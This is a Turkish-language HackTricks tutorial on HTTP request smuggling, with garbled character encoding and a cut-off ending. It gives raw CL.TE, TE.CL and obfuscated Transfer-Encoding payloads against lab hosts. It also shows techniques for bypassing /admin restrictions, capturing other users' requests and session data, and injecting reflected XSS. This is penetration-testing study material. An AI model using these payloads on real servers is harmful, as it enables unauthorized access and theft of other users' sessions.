# HTTP Ä°stek Smugglingi / HTTP Desenkronizasyon SaldÄ±rÄ±sÄ±

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramanlÄ±k seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi paylaÅŸÄ±n**, [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek.

</details>

## Nedir

Bu zafiyet, **Ã¶n uÃ§ proxy'ler** ve **arka uÃ§ sunucu** arasÄ±ndaki **desenkronizasyon** nedeniyle bir **saldÄ±rganÄ±n** bir HTTP **istek**ini gÃ¶ndermesine izin verir. Bu istek, **Ã¶n uÃ§** proxy'ler (yÃ¼k dengeleyici/ters proxy) tarafÄ±ndan **tek bir istek** olarak **yorumlanÄ±rken**, **arka uÃ§** sunucu tarafÄ±ndan **2 istek** olarak **yorumlanÄ±r**.\
Bu, bir kullanÄ±cÄ±nÄ±n **kendi sonraki isteÄŸini deÄŸiÅŸtirmesine** olanak tanÄ±r.

### Teori

[**RFC Spesifikasyonu (2161)**](https://tools.ietf.org/html/rfc2616)

> Bir mesaj, hem Transfer-Encoding baÅŸlÄ±k alanÄ± hem de Content-Length baÅŸlÄ±k alanÄ± ile alÄ±nÄ±rsa, ikincisi yoksayÄ±lÄ±r.

**Content-Length**

> Content-Length varlÄ±k baÅŸlÄ±k alanÄ±, alÄ±cÄ±ya gÃ¶nderilen varlÄ±k gÃ¶vdesinin bayt cinsinden boyutunu belirtir.

**Transfer-Encoding: chunked**

> Transfer-Encoding baÅŸlÄ±k alanÄ±, yÃ¼k gÃ¶vdesini kullanÄ±cÄ±ya gÃ¼venli bir ÅŸekilde aktarmak iÃ§in kullanÄ±lan kodlama biÃ§imini belirtir.\
> Chunked, bÃ¼yÃ¼k verilerin bir dizi parÃ§ada gÃ¶nderildiÄŸi anlamÄ±na gelir.

### GerÃ§eklik

**Ã–n uÃ§** (yÃ¼k dengeleyici / ters proxy) _**content-length**_ veya _**transfer-encoding**_ baÅŸlÄ±ÄŸÄ±nÄ± iÅŸlerken, **arka uÃ§** sunucu **diÄŸerini** iÅŸler ve bu, 2 sistem arasÄ±nda bir **desenkronizasyon** oluÅŸturur.\
Bu, **bir saldÄ±rganÄ±n ters proxy'ye bir istek gÃ¶ndermesine** izin verir ve bu istek, **arka uÃ§** sunucu tarafÄ±ndan **2 farklÄ± istek olarak yorumlanÄ±r**. Bu teknikteki **tehlike**, **arka uÃ§** sunucunun **enjekte edilen 2. isteÄŸi** bir sonraki istemciden geldiÄŸi gibi **yorumlamasÄ±** ve bu istemcinin **gerÃ§ek isteÄŸinin** enjekte edilen isteÄŸin bir **parÃ§asÄ±** olmasÄ±dÄ±r.

### Ã–zellikler

HTTP'de **bir yeni satÄ±r karakteri 2 bayttan oluÅŸur**:

* **Content-Length**: Bu baÅŸlÄ±k, isteÄŸin gÃ¶vdesinin **bayt** cinsinden **boyutunu** belirtmek iÃ§in **ondalÄ±k bir sayÄ±** kullanÄ±r. GÃ¶vde, **isteÄŸin son karakteriyle biter, isteÄŸin sonunda yeni bir satÄ±ra ihtiyaÃ§ yoktur**.
* **Transfer-Encoding:** Bu baÅŸlÄ±k, **hexadecimal bir sayÄ±** kullanarak **sonraki parÃ§anÄ±n** **bayt** cinsinden **boyutunu** belirtir. **ParÃ§a**, bir **yeni satÄ±r** ile **sonlandÄ±rÄ±lmalÄ±dÄ±r**, ancak bu yeni satÄ±r **uzunluk gÃ¶stergesi tarafÄ±ndan sayÄ±lmaz**. Bu aktarÄ±m yÃ¶ntemi, **0 boyutunda bir parÃ§a ile 2 yeni satÄ±r ile sonlandÄ±rÄ±lmalÄ±dÄ±r**: `0`
* **Connection**: Deneyimime dayanarak, Ä°stek Smuggling'in ilk isteÄŸinde **`Connection: keep-alive`** kullanmanÄ±zÄ± Ã¶neririm.

## Temel Ã–rnekler

HTTP istek smugling saldÄ±rÄ±larÄ±, Ã¶n uÃ§ ve arka uÃ§ sunucularÄ±n `Content-Length` (CL) ve `Transfer-Encoding` (TE) baÅŸlÄ±klarÄ±nÄ± nasÄ±l yorumladÄ±ÄŸÄ±ndaki farklÄ±lÄ±klarÄ± sÃ¶mÃ¼ren belirsiz istekler gÃ¶nderilerek oluÅŸturulur. Bu saldÄ±rÄ±lar, temel olarak **CL.TE**, **TE.CL** ve **TE.TE** olarak ortaya Ã§Ä±kar. Her bir tÃ¼r, Ã¶n uÃ§ ve arka uÃ§ sunucularÄ±n bu baÅŸlÄ±klara Ã¶ncelik verme ÅŸekillerinin benzersiz bir kombinasyonunu temsil eder. Zafiyetler, sunucularÄ±n aynÄ± isteÄŸi farklÄ± ÅŸekillerde iÅŸlemesi nedeniyle ortaya Ã§Ä±kar ve beklenmeyen ve potansiyel olarak zararlÄ± sonuÃ§lara yol aÃ§ar.

### Temel Zafiyet TÃ¼rlerinin Ã–rnekleri

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### CL.TE Zafiyeti (Ã–n UÃ§ tarafÄ±ndan Content-Length kullanÄ±lÄ±r, Arka UÃ§ tarafÄ±ndan Transfer-Encoding kullanÄ±lÄ±r)
- **Ã–n UÃ§ (CL):** Ä°steÄŸi `Content-Length` baÅŸlÄ±ÄŸÄ±na dayanarak iÅŸler.
- **Arka UÃ§ (TE):** Ä°steÄŸi `Transfer-Encoding` baÅŸlÄ±ÄŸÄ±na dayanarak iÅŸler.
- **SaldÄ±rÄ± Senaryosu:**
- SaldÄ±rgan, `Content-Length` baÅŸlÄ±ÄŸÄ±nÄ±n deÄŸeriyle gerÃ§ek iÃ§erik uzunluÄŸunun eÅŸleÅŸmediÄŸi bir istek gÃ¶nderir.
- Ã–n uÃ§ sunucusu, `Content-Length` deÄŸerine dayanarak tÃ¼m isteÄŸi arka uca iletilir.
- Arka uÃ§ sunucusu, `Transfer-Encoding: chunked` baÅŸlÄ±ÄŸÄ± nedeniyle isteÄŸi parÃ§alara ayÄ±rarak, kalan veriyi ayrÄ± bir sonraki istek olarak yorumlar.
- **Ã–rnek:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Zafiyeti (Ã–n UÃ§ tarafÄ±ndan Transfer-Encoding kullanÄ±lÄ±r, Arka UÃ§ tarafÄ±ndan Content-Length kullanÄ±lÄ±r)
- **Ã–n UÃ§ (TE):** Ä°steÄŸi `Transfer-Encoding` baÅŸlÄ±ÄŸÄ±na dayanarak iÅŸler.
- **Arka UÃ§ (CL):** Ä°steÄŸi `Content-Length` baÅŸlÄ±ÄŸÄ±na dayanarak iÅŸler.
- **SaldÄ±rÄ± Senaryosu:**
- SaldÄ±rgan, parÃ§alÄ± bir istek gÃ¶nderir, burada parÃ§a boyutu (`7b`) ve gerÃ§ek iÃ§erik uzunluÄŸu (`Content-Length: 4`) hizalanmaz.
- Ã–n uÃ§ sunucusu, `Transfer-Encoding`i onaylayarak tÃ¼m isteÄŸi arka uca iletilir.
- Arka uÃ§ sunucusu, `Content-Length`i dikkate alarak yalnÄ±zca isteÄŸin baÅŸlangÄ±Ã§ kÄ±smÄ±nÄ± (`7b` bayt) iÅŸler ve geri kalanÄ±nÄ± istenmeyen bir sonraki isteÄŸin bir parÃ§asÄ± olarak bÄ±rakÄ±r.
- **Ã–rnek:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```
#### TE.TE Zafiyeti (Her ikisi de Transfer-Encoding'i kullanÄ±r, ancak obfuskasyon ile biri aldatÄ±labilir)
- **Sunucular:** Her ikisi de `Transfer-Encoding`i destekler, ancak obfuskasyon yoluyla biri bunu gÃ¶rmezden gelebilir.
- **SaldÄ±rÄ± Senaryosu:**
- SaldÄ±rgan, obfuskasyonlu `Transfer-Encoding` baÅŸlÄ±klarÄ±nÄ± iÃ§eren bir istek gÃ¶nderir.
- Obfuskasyonu tanÄ±yamayan sunucu (Ã¶n uÃ§ veya arka uÃ§) tarafÄ±ndan belirlenir ve CL.TE veya TE.CL zafiyeti sÃ¶mÃ¼rÃ¼lebilir.
- Bir sunucu tarafÄ±ndan gÃ¶rÃ¼len iÅŸlenmemiÅŸ isteÄŸin bir kÄ±smÄ±, bir sonraki isteÄŸin bir parÃ§asÄ± haline gelir ve smuggling'e yol aÃ§ar.
- **Ã–rnek:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Senaryosu (Her Ä°ki Ã–n UÃ§ ve Arka UÃ§ TarafÄ±ndan Content-Length KullanÄ±lÄ±r):**
- Her iki sunucu da isteÄŸi yalnÄ±zca `Content-Length` baÅŸlÄ±ÄŸÄ±na dayanarak iÅŸler.
- Bu senaryo genellikle smuggling'e yol aÃ§maz, Ã§Ã¼nkÃ¼ her iki sunucunun isteÄŸin uzunluÄŸunu nasÄ±l yorumladÄ±ÄŸÄ± konusunda hizalanma vardÄ±r.
- **Ã–rnek:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Ä°stek
```

#### **CL != 0 Senaryosu:**
- Ä°steÄŸin gÃ¶vdesinin iÃ§eriÄŸi olduÄŸunu gÃ¶steren ve sÄ±fÄ±rdan farklÄ± bir deÄŸere sahip olan `Content-Length` baÅŸlÄ±ÄŸÄ±nÄ±n bulunduÄŸu senaryolara atÄ±fta bulunur.
- Bu, smuggling saldÄ±rÄ±larÄ±nÄ± anlama ve oluÅŸturma aÃ§Ä±sÄ±ndan Ã¶nemlidir, Ã§Ã¼nkÃ¼ sunucularÄ±n bir isteÄŸin sonunu nasÄ±l belirlediÄŸini etkiler.
- **Ã–rnek:**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

BoÅŸ Olmayan GÃ¶vde
```

#### Hop-by-hop baÅŸlÄ±klar aracÄ±lÄ±ÄŸÄ±yla zorlama

Hop-by-hop baÅŸlÄ±klarÄ± kÃ¶tÃ¼ye kullanarak, proxy'e **Content-Length veya Transfer-Encoding baÅŸlÄ±ÄŸÄ±nÄ± silmesini belirtebilir ve bÃ¶ylece bir HTTP isteÄŸi smuggling saldÄ±rÄ±sÄ±nÄ±n kÃ¶tÃ¼ye kullanÄ±lmasÄ±nÄ± saÄŸlayabilirsiniz**.
```
Connection: Content-Length
```
Daha fazla bilgi iÃ§in **hop-by-hop baÅŸlÄ±klarÄ±nÄ± kÃ¶tÃ¼ye kullanma** ziyaret edin:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}


## HTTP Ä°stek Smuggling Bulma

HTTP istek smuggling zafiyetlerini tespit etmek genellikle sunucunun manipÃ¼le edilmiÅŸ isteklere nasÄ±l yanÄ±t verdiÄŸini gÃ¶zlemlemeye dayanan zamanlama teknikleri kullanÄ±larak gerÃ§ekleÅŸtirilebilir. Bu teknikler Ã¶zellikle CL.TE ve TE.CL zafiyetlerini tespit etmek iÃ§in kullanÄ±ÅŸlÄ±dÄ±r. Bu yÃ¶ntemlerin yanÄ± sÄ±ra, bÃ¶yle zafiyetleri bulmak iÃ§in kullanÄ±labilecek diÄŸer stratejiler ve araÃ§lar vardÄ±r:

### CL.TE Zafiyetlerini Zamanlama Teknikleri Kullanarak Bulma
- **YÃ¶ntem:**
- Uygulama zafiyetli ise, arka uÃ§ sunucunun ek veri beklemesi iÃ§in bir istek gÃ¶nderin.
- **Ã–rnek:**
```
POST / HTTP/1.1
Host: zafiyetli-web sitesi.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
- **GÃ¶zlem:**
- Ã–n uÃ§ sunucu isteÄŸi `Content-Length`e dayanarak iÅŸler ve mesajÄ± erken keser.
- Arka uÃ§ sunucu, parÃ§alÄ± bir mesaj bekleyerek, hiÃ§ gelmeyen bir sonraki parÃ§ayÄ± bekler ve gecikmeye neden olur.

- **Belirtiler:**
- YanÄ±tta zaman aÅŸÄ±mÄ± veya uzun gecikmeler.
- Arka uÃ§ sunucudan 400 Bad Request hatasÄ± almak, bazen ayrÄ±ntÄ±lÄ± sunucu bilgileriyle birlikte.

### TE.CL Zafiyetlerini Zamanlama Teknikleri Kullanarak Bulma
- **YÃ¶ntem:**
- Uygulama zafiyetli ise, arka uÃ§ sunucunun ek veri beklemesi iÃ§in bir istek gÃ¶nderin.
- **Ã–rnek:**
```
POST / HTTP/1.1
Host: zafiyetli-web sitesi.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
- **GÃ¶zlem:**
- Ã–n uÃ§ sunucu isteÄŸi `Transfer-Encoding`e dayanarak iÅŸler ve tÃ¼m mesajÄ± ileterek ilerler.
- Arka uÃ§ sunucu, `Content-Length`e dayalÄ± bir mesaj bekleyerek, hiÃ§ gelmeyen ek veri bekler ve gecikmeye neden olur.

### Zafiyetleri Bulmak Ä°Ã§in DiÄŸer YÃ¶ntemler
- **Diferansiyel YanÄ±t Analizi:**
- Bir isteÄŸin hafifÃ§e deÄŸiÅŸtirilmiÅŸ versiyonlarÄ±nÄ± gÃ¶nderin ve sunucu yanÄ±tlarÄ±nÄ±n beklenmedik bir ÅŸekilde farklÄ±laÅŸÄ±p farklÄ±laÅŸmadÄ±ÄŸÄ±nÄ± gÃ¶zlemleyin, bu da bir ayrÄ±ÅŸtÄ±rma uyumsuzluÄŸunu gÃ¶sterir.

- **Otomatik AraÃ§lar Kullanma:**
- Burp Suite'in 'HTTP Request Smuggler' uzantÄ±sÄ± gibi araÃ§lar, belirsiz isteklerin Ã§eÅŸitli ÅŸekillerini gÃ¶ndererek ve yanÄ±tlarÄ± analiz ederek bu zafiyetleri otomatik olarak test edebilir.

- **Content-Length DeÄŸiÅŸkenlik Testleri:**
- GerÃ§ek iÃ§erik uzunluÄŸuyla hizalanmayan deÄŸiÅŸen `Content-Length` deÄŸerlerine sahip istekler gÃ¶nderin ve sunucunun bÃ¶yle uyumsuzluklarÄ± nasÄ±l iÅŸlediÄŸini gÃ¶zlemleyin.

- **Transfer-Encoding DeÄŸiÅŸkenlik Testleri:**
- ÅifrelenmiÅŸ veya hatalÄ± biÃ§imlendirilmiÅŸ `Transfer-Encoding` baÅŸlÄ±klarÄ±na sahip istekler gÃ¶nderin ve Ã¶n uÃ§ ve arka uÃ§ sunucularÄ±n bÃ¶yle manipÃ¼lasyonlara nasÄ±l farklÄ± yanÄ±t verdiÄŸini izleyin.


### HTTP Ä°stek Smuggling Zafiyet Testi

Zamanlama tekniklerinin etkinliÄŸini doÄŸruladÄ±ktan sonra, istemci isteklerinin manipÃ¼le edilip edilemeyeceÄŸini doÄŸrulamak Ã¶nemlidir. Basit bir yÃ¶ntem, Ã¶rneÄŸin `/` iÃ§in bir 404 yanÄ±tÄ± elde etmek iÃ§in isteklerinizi zehirlemeye Ã§alÄ±ÅŸmaktÄ±r. Ã–nceki olarak tartÄ±ÅŸÄ±lan `CL.TE` ve `TE.CL` Ã¶rnekleri, istemcinin farklÄ± bir kaynaÄŸa eriÅŸmeyi amaÃ§lasa bile istemcinin isteÄŸini zehirlemek iÃ§in nasÄ±l kullanÄ±labileceÄŸini gÃ¶stermektedir.

**Ana DÃ¼ÅŸÃ¼nceler**

DiÄŸer isteklere mÃ¼dahale ederek istek smuggling zafiyetlerini test ederken aÅŸaÄŸÄ±daki hususlarÄ± gÃ¶z Ã¶nÃ¼nde bulundurun:

* **FarklÄ± AÄŸ BaÄŸlantÄ±larÄ±:** "SaldÄ±rÄ±" ve "normal" istekler ayrÄ± aÄŸ baÄŸlantÄ±larÄ± Ã¼zerinden gÃ¶nderilmelidir. Her ikisi iÃ§in aynÄ± baÄŸlantÄ±yÄ± kullanmak, zafiyetin varlÄ±ÄŸÄ±nÄ± doÄŸrulamaz.
* **TutarlÄ± URL ve Parametreler:** Her iki istek iÃ§in de aynÄ± URL'leri ve parametre adlarÄ±nÄ± kullanmaya Ã§alÄ±ÅŸÄ±n. Modern uygulamalar genellikle URL ve parametrelere dayanarak istekleri belirli arka uÃ§ sunuculara yÃ¶nlendirir. Bu eÅŸleÅŸmeler, her iki isteÄŸin aynÄ± sunucu tarafÄ±ndan iÅŸlenmesi iÃ§in gereklidir ve baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in bir Ã¶nkoÅŸuldur.
* **Zamanlama ve YarÄ±ÅŸ KoÅŸullarÄ±:** "Normal" istek, "saldÄ±rÄ±" isteÄŸinden kaynaklanan mÃ¼dahaleyi tespit etmek iÃ§in diÄŸer eÅŸzamanlÄ± uygulama istekleriyle rekabet eder. Bu nedenle, "normal" isteÄŸi hemen "saldÄ±rÄ±" isteÄŸinden sonra gÃ¶nderin. YoÄŸun uygulamalar, kesin zafiyet doÄŸrulamasÄ± iÃ§in birden fazla deneme gerektirebilir.
* **YÃ¼k Dengeleme ZorluklarÄ±:** YÃ¼k dengeleyici olarak hareket eden Ã¶n uÃ§ sunucular, istekleri Ã§eÅŸitli arka uÃ§ sistemlere daÄŸÄ±tabilir. "SaldÄ±rÄ±" ve "normal" istekler farklÄ± sistemlere yÃ¶nlendirilirse, saldÄ±rÄ± baÅŸarÄ±lÄ± olmaz. Bu yÃ¼k dengeleme yÃ¶nÃ¼, bir zafiyeti doÄŸrulamak iÃ§in birkaÃ§ deneme gerektirebilir.
* **Beklenmeyen KullanÄ±cÄ± Etkisi:** SaldÄ±rÄ±nÄ±zÄ±n yanlÄ±ÅŸlÄ±kla baÅŸka bir kullanÄ±cÄ±nÄ±n isteÄŸini etkilemesi durumunda (tespit iÃ§in gÃ¶nderdiÄŸiniz "normal" istek deÄŸil), saldÄ±rÄ±nÄ±zÄ±n baÅŸka bir uygulama kullanÄ±cÄ±sÄ±nÄ± etkilediÄŸini gÃ¶sterir. SÃ¼rekli testler diÄŸer kullanÄ±cÄ±larÄ± etkileyebilir, bu nedenle dikkatli bir yaklaÅŸÄ±m gerektirebilir.


## HTTP Ä°stek Smuggling KÃ¶tÃ¼ye Kullanma

### Ã–n uÃ§ gÃ¼venlik kontrollerini atlatmak iÃ§in

### HTTP Ä°stek Smuggling AracÄ±lÄ±ÄŸÄ±yla Ã–n UÃ§ GÃ¼venliÄŸi GeÃ§me

BazÄ± durumlarda, Ã¶n uÃ§ proxy'ler gelen istekleri denetleyerek gÃ¼venlik Ã¶nlemleri uygular. Ancak, bu Ã¶nlemler HTTP Ä°stek Smuggling'i kÃ¶tÃ¼ye kullanarak atlanabilir ve kÄ±sÄ±tlanmÄ±ÅŸ uÃ§ noktalara izinsiz eriÅŸim saÄŸlanabilir. Ã–rneÄŸin, `/admin`'e eriÅŸim dÄ±ÅŸarÄ±dan engellenmiÅŸ olabilir ve Ã¶n uÃ§ proxy bu tÃ¼r giriÅŸimleri aktif olarak engelleyebilir. Bununla birlikte, bu proxy, bir HTTP isteÄŸi iÃ§indeki gÃ¶mÃ¼lÃ¼ istekleri denetlemeyebilir ve bu kÄ±sÄ±tlamalarÄ± atlamak iÃ§in bir aÃ§Ä±k bÄ±rakabilir.

AÅŸaÄŸÄ±daki Ã¶rnekler, HTTP Ä°stek Smuggling'in Ã¶n uÃ§ gÃ¼venlik kontrollerini atlamak iÃ§in nasÄ±l kullanÄ±labileceÄŸini, Ã¶zellikle Ã¶n uÃ§ proxy tarafÄ±ndan genellikle korunan `/admin` yolunu hedefleyerek gÃ¶stermektedir:

**CL.TE Ã–rneÄŸi**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
CL.TE saldÄ±rÄ±sÄ±nda, baÅŸlangÄ±Ã§ isteÄŸi iÃ§in `Content-Length` baÅŸlÄ±ÄŸÄ± kullanÄ±lÄ±rken, sonraki gÃ¶mÃ¼lÃ¼ istek `Transfer-Encoding: chunked` baÅŸlÄ±ÄŸÄ±nÄ± kullanÄ±r. Ã–n uÃ§ proxy, baÅŸlangÄ±Ã§ `POST` isteÄŸini iÅŸler ancak gÃ¶mÃ¼lÃ¼ `GET /admin` isteÄŸini denetlemez, bu da `/admin` yoluna izinsiz eriÅŸime izin verir.

**TE.CL Ã–rneÄŸi**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Tersine, TE.CL saldÄ±rÄ±sÄ±nda, baÅŸlangÄ±Ã§taki `POST` isteÄŸi `Transfer-Encoding: chunked` kullanÄ±r ve ardÄ±ÅŸÄ±k gÃ¶mÃ¼lÃ¼ istek, `Content-Length` baÅŸlÄ±ÄŸÄ±na dayalÄ± olarak iÅŸlenir. CL.TE saldÄ±rÄ±sÄ±na benzer ÅŸekilde, Ã¶n uÃ§ proxy, gizli `GET /admin` isteÄŸini gÃ¶z ardÄ± ederek sÄ±nÄ±rlÄ± `/admin` yoluna eriÅŸim saÄŸlar.

### Ã–n uÃ§ isteÄŸi yeniden yazmayÄ± ortaya Ã§Ä±karma <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Uygulamalar genellikle gelen istekleri arka uÃ§ sunucuya iletmek Ã¶ncesinde bir **Ã¶n uÃ§ sunucusu** kullanÄ±r. Tipik bir deÄŸiÅŸiklik, `X-Forwarded-For: <Ä°stemcinin IP'si>` gibi baÅŸlÄ±klar eklemektir, bÃ¶ylece istemcinin IP'si arka uca iletilir. Bu deÄŸiÅŸiklikleri anlamak, **korumalarÄ± atlamak** veya **gizli bilgileri veya uÃ§ noktalarÄ± ortaya Ã§Ä±karmak** iÃ§in Ã¶nemli olabilir.

Bir proxy'nin bir isteÄŸi nasÄ±l deÄŸiÅŸtirdiÄŸini araÅŸtÄ±rmak iÃ§in, arka uÃ§tan yanÄ±tta yankÄ±lanan bir POST parametresi bulun. ArdÄ±ndan, aÅŸaÄŸÄ±daki gibi bu parametreyi en son kullanarak bir istek oluÅŸturun:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Bu yapÄ±da, ardÄ±ÅŸÄ±k istek bileÅŸenleri `search=`'den sonra eklenir ve bu parametre yanÄ±tta yansÄ±tÄ±lÄ±r. Bu yansÄ±ma, ardÄ±ÅŸÄ±k isteÄŸin baÅŸlÄ±klarÄ±nÄ± ortaya Ã§Ä±karacaktÄ±r.

GÃ¶mÃ¼lÃ¼ isteÄŸin `Content-Length` baÅŸlÄ±ÄŸÄ±nÄ± gerÃ§ek iÃ§erik uzunluÄŸuyla hizalamak Ã¶nemlidir. KÃ¼Ã§Ã¼k bir deÄŸerle baÅŸlamak ve giderek artÄ±rmak tavsiye edilir, Ã§Ã¼nkÃ¼ Ã§ok dÃ¼ÅŸÃ¼k bir deÄŸer yansÄ±tÄ±lan verileri kesebilirken, Ã§ok yÃ¼ksek bir deÄŸer isteÄŸin hata vermesine neden olabilir.

Bu teknik aynÄ± zamanda bir TE.CL zafiyeti baÄŸlamÄ±nda da uygulanabilir, ancak istek `search=\r\n0` ile sonlandÄ±rÄ±lmalÄ±dÄ±r. Yeni satÄ±r karakterlerinden baÄŸÄ±msÄ±z olarak, deÄŸerler arama parametresine eklenecektir.

Bu yÃ¶ntem, temel olarak Ã¶n uÃ§ proxy tarafÄ±ndan yapÄ±lan istek deÄŸiÅŸikliklerini anlamak iÃ§in kullanÄ±lÄ±r ve esasen bir Ã¶z-yÃ¶nlendirilen soruÅŸturma gerÃ§ekleÅŸtirir.

### DiÄŸer kullanÄ±cÄ±larÄ±n isteklerini yakalama <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Bir POST iÅŸlemi sÄ±rasÄ±nda bir parametrenin deÄŸeri olarak belirli bir isteÄŸi ekleyerek, bir sonraki kullanÄ±cÄ±nÄ±n isteklerini yakalamak mÃ¼mkÃ¼ndÃ¼r. Ä°ÅŸte bunu nasÄ±l baÅŸarabilirsiniz:

AÅŸaÄŸÄ±daki isteÄŸi bir parametrenin deÄŸeri olarak ekleyerek, sonraki istemci isteÄŸini depolayabilirsiniz:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
Bu senaryoda, **yorum parametresi**, herkese aÃ§Ä±k bir sayfadaki bir gÃ¶nderinin yorum bÃ¶lÃ¼mÃ¼nde iÃ§eriÄŸi depolamak iÃ§in kullanÄ±lÄ±r. Sonraki isteÄŸin iÃ§eriÄŸi bir yorum olarak gÃ¶rÃ¼necektir.

Ancak, bu teknik sÄ±nÄ±rlamalara sahiptir. Genellikle, sÄ±zdÄ±rÄ±lan istekte kullanÄ±lan parametre ayÄ±rÄ±cÄ±sÄ±na kadar olan verileri yakalar. URL kodlu form gÃ¶nderimleri iÃ§in bu ayÄ±rÄ±cÄ± `&` karakteridir. Bu, kurban kullanÄ±cÄ±nÄ±n isteÄŸinden yakalanan iÃ§eriÄŸin ilk `&` karakterine kadar duracaÄŸÄ± anlamÄ±na gelir ve hatta sorgu dizgisinin bir parÃ§asÄ± olabilir.

AyrÄ±ca, bu yaklaÅŸÄ±mÄ±n TE.CL zafiyetiyle de mÃ¼mkÃ¼n olduÄŸunu belirtmek Ã¶nemlidir. Bu tÃ¼r durumlarda, istek `search=\r\n0` ile sonuÃ§lanmalÄ±dÄ±r. Yeni satÄ±r karakterlerine bakÄ±lmaksÄ±zÄ±n, deÄŸerler arama parametresine eklenecektir.

### YansÄ±tÄ±lan XSS'i sÃ¶mÃ¼rmek iÃ§in HTTP isteÄŸi sÄ±zdÄ±rma

HTTP Ä°stek SÄ±zdÄ±rma, **YansÄ±tÄ±lan XSS**'e karÅŸÄ± savunmasÄ±z web sayfalarÄ±nÄ± sÃ¶mÃ¼rmek iÃ§in kullanÄ±labilir ve Ã¶nemli avantajlar sunar:

* Hedef kullanÄ±cÄ±larla etkileÅŸim **gerektirmez**.
* Normalde ulaÅŸÄ±lamayan isteklerin bir parÃ§asÄ± olan HTTP istek baÅŸlÄ±klarÄ±nda XSS'in sÃ¶mÃ¼rÃ¼lmesine **izin verir**.

Bir web sitesinin User-Agent baÅŸlÄ±ÄŸÄ± aracÄ±lÄ±ÄŸÄ±yla YansÄ±tÄ±lan XSS'e duyarlÄ± olduÄŸu senaryolarda, aÅŸaÄŸÄ±daki yÃ¼k, bu zafiyeti nasÄ±l sÃ¶mÃ¼rÃ¼leceÄŸini gÃ¶stermektedir:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
